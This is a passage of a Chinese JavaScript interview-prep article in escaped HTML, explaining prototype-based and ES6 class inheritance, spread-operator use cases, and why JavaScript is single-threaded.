class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">// Parent.apply(this, arguments);</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">var</span> child <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Child</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"jin\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nchild<span class=\"token punctuation\">.</span><span class=\"token function\">printName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// jin</span>\nchild<span class=\"token punctuation\">.</span><span class=\"token function\">sayName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// Error</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>原理：使用call或者apply更改子类函数的作用域，使this执行父类构造函数，子类因此可以继承父类共有属性<br>优点：可解决原型链继承的缺点<br>缺点：不可继承父类的原型链方法，构造函数不可复用</p>\n</li>\n<li><p>组合继承</p>\n<p>原理：综合使用构造函数继承和原型链继承</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">Parent</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">name<span class=\"token punctuation\">,</span> id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>id <span class=\"token operator\">=</span> id<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function-variable function\">printName</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token class-name\">Parent</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">sayName</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">Child</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">name<span class=\"token punctuation\">,</span> id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token function\">Parent</span><span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">// Parent.apply(this, arguments);</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token class-name\">Child</span><span class=\"token punctuation\">.</span>prototype <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Parent</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> child <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Child</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"jin\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nchild<span class=\"token punctuation\">.</span><span class=\"token function\">printName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// jin</span>\nchild<span class=\"token punctuation\">.</span><span class=\"token function\">sayName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// jin</span>\n\n<span class=\"token keyword\">var</span> a <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Child</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> b <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Child</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\na<span class=\"token punctuation\">.</span>list<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token string\">'b'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">.</span>list<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// ['a']</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>优点：可继承父类原型上的属性，且可传参；每个新实例引入的构造函数是私有的<br>缺点：会执行两次父类的构造函数，消耗较大内存，子类的构造函数会代替原型上的那个父类构造函数</p>\n</li>\n<li><p>原型式继承</p>\n<p>原理：类似Object.create，用一个函数包装一个对象，然后返回这个函数的调用，这个函数就变成了个可以随意增添属性的实例或对象，结果是将子对象的<code>__proto__</code>指向父对象</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> parent <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token literal-property property\">names</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">copy</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">object</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token constant\">F</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n  <span class=\"token class-name\">F</span><span class=\"token punctuation\">.</span>prototype <span class=\"token operator\">=</span> object<span class=\"token punctuation\">;</span>    \n  <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">F</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">var</span> child <span class=\"token operator\">=</span> <span class=\"token function\">copy</span><span class=\"token punctuation\">(</span>parent<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>缺点：共享引用类型</p>\n</li>\n<li><p>寄生式继承</p>\n<p>原理：二次封装原型式继承，并拓展</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">createObject</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">obj</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">var</span> o <span class=\"token operator\">=</span> <span class=\"token function\">copy</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  o<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">getNames</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>names<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>names<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">return</span> o<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>优点：可添加新的属性和方法</p>\n</li>\n<li><p>寄生组合式继承</p>\n<p>原理：改进组合继承，利用寄生式继承的思想继承原型</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">inheritPrototype</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">subClass<span class=\"token punctuation\">,</span> superClass</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token comment\">// 复制一份父类的原型</span>\n  <span class=\"token keyword\">var</span> p <span class=\"token operator\">=</span> <span class=\"token function\">copy</span><span class=\"token punctuation\">(</span>superClass<span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">// 修正构造函数</span>\n  p<span class=\"token punctuation\">.</span>constructor <span class=\"token operator\">=</span> subClass<span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">// 设置子类原型</span>\n  subClass<span class=\"token punctuation\">.</span>prototype <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">Parent</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">name<span class=\"token punctuation\">,</span> id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>id <span class=\"token operator\">=</span> id<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function-variable function\">printName</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token class-name\">Parent</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">sayName</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">Child</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">name<span class=\"token punctuation\">,</span> id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token function\">Parent</span><span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">// Parent.apply(this, arguments);</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token function\">inheritPrototype</span><span class=\"token punctuation\">(</span>Child<span class=\"token punctuation\">,</span> Parent<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ol>\n<p><img src=\"https://static.nowcoder.com/images/activity/2021jxy/front/images/16cc75d62ddf654f.png\"></p>\n<h3 id=\"38、ES6继承\"><a href=\"#38、ES6继承\" class=\"headerlink\" title=\"38、ES6继承\"></a>38、ES6继承</h3><pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Parent</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token function\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"kif\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>age <span class=\"token operator\">=</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Child</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Parent</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token function\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">id</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>id <span class=\"token operator\">=</span> id<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">let</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Child</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p><img src=\"https://static.nowcoder.com/images/activity/2021jxy/front/images/16cc75d62ddf654f11.png\"></p>\n<h3 id=\"39、扩展操作符…\"><a href=\"#39、扩展操作符…\" class=\"headerlink\" title=\"39、扩展操作符…\"></a>39、扩展操作符…</h3><p><strong>适用类型</strong>：数组、对象、字符串。</p>\n<p>复杂数据类型都可以，当要转化为可迭代数据结构时可设置对象的迭代器对扩展运算符扩展出来的值进行操作。</p>\n<p>基础数据只有string可以使用扩展运算符，number,boolean,null,undefined无效</p>\n<p><strong>扩展运算符的应用场景</strong></p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token comment\">// 1、函数调用</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">x<span class=\"token punctuation\">,</span> y</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">return</span> x <span class=\"token operator\">+</span> y<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token operator\">...</span><span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">38</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">v<span class=\"token punctuation\">,</span> w<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">,</span> z</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">...</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">...</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 123456789</span>\n\n<span class=\"token comment\">//2.往数组里push多个元素</span>\n<span class=\"token keyword\">var</span> arr1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> arr2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\narr1<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token operator\">...</span>arr2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>arr1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//[0,1,2,3,4,5]</span>\n<span class=\"token comment\">//123456</span>\n\n<span class=\"token comment\">//3.替代函数的apply方法</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">,</span> z</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  <span class=\"token punctuation\">&#125;</span>  \n<span class=\"token keyword\">var</span> args <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">f</span><span class=\"token punctuation\">.</span><span class=\"token function\">apply</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//ES5 的写法</span>\n<span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token operator\">...</span>args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//ES6的写法</span>\n<span class=\"token comment\">// 123456</span>\n\n<span class=\"token comment\">//4.求一个数组的最大数简化</span>\nMath<span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">.</span><span class=\"token function\">apply</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">77</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">//ES5 的写法</span>\nMath<span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span><span class=\"token operator\">...</span><span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">77</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">//ES6 的写法，等同于Math.max(14, 3, 77)</span>\n<span class=\"token comment\">//1234</span>\n\n<span class=\"token comment\">//5.扩展运算符后面可以放表达式</span>\n<span class=\"token keyword\">const</span> arr <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">?</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//['a','b'] </span>\n<span class=\"token comment\">//1234</span>\n\n<span class=\"token comment\">//6.与解构赋值结合，用于生成数组</span>\n<span class=\"token keyword\">const</span> a1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> a2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span>a1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//写法1</span>\n<span class=\"token keyword\">const</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span>a2<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a1<span class=\"token punctuation\">;</span>  <span class=\"token comment\">//写法2</span>\n<span class=\"token keyword\">const</span> <span class=\"token punctuation\">[</span>first<span class=\"token punctuation\">,</span> <span class=\"token operator\">...</span>rest<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\nfirst  <span class=\"token comment\">//1</span>\nrest  <span class=\"token comment\">//[2, 3, 4, 5]</span>\n\n<span class=\"token keyword\">const</span> <span class=\"token punctuation\">[</span>first<span class=\"token punctuation\">,</span> <span class=\"token operator\">...</span>rest<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\nfirst  <span class=\"token comment\">//undefined</span>\nrest  <span class=\"token comment\">//[]</span>\n\n<span class=\"token keyword\">const</span> <span class=\"token punctuation\">[</span>first<span class=\"token punctuation\">,</span> <span class=\"token operator\">...</span>rest<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"foo\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\nfirst  <span class=\"token comment\">//\"foo\"</span>\nrest   <span class=\"token comment\">//[]</span>\n<span class=\"token comment\">//1234567891011121314151617</span>\n\n<span class=\"token comment\">//7.合并数组</span>\n<span class=\"token punctuation\">[</span><span class=\"token operator\">...</span>arr1<span class=\"token punctuation\">,</span> <span class=\"token operator\">...</span>arr2<span class=\"token punctuation\">,</span> <span class=\"token operator\">...</span>arr3<span class=\"token punctuation\">]</span>  <span class=\"token comment\">//[ 'a', 'b', 'c', 'd', 'e' ]</span>\n\n\n<span class=\"token comment\">//8.数组的克隆——————————————————————特别注意</span>\n<span class=\"token keyword\">var</span> arr1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> arr2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span>arr1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\narr1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">100</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>arr2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//[0, 1, 2]  </span>\n\n<span class=\"token comment\">/* 乍一看，arr2与arr1不共用引用地址，arr2不随着arr1变化，接着往下看 */</span>\n\n<span class=\"token keyword\">var</span> arr1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token number\">111</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> arr2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span>arr1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\narr1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">100</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>arr2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//[0, [100,11,111], 2]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"40、为什么js是单线程\"><a href=\"#40、为什么js是单线程\" class=\"headerlink\" title=\"40、为什么js是单线程\"></a>40、为什么js是单线程</h3><p><strong>参考答案：</strong></p>\n<p>这主要和js的用途有关，js是作为浏览器的脚本语言，主要是实现用户与浏览器的交互，以及操作dom；这决定了它只能是单线程，否则会带来很复杂的同步问题。 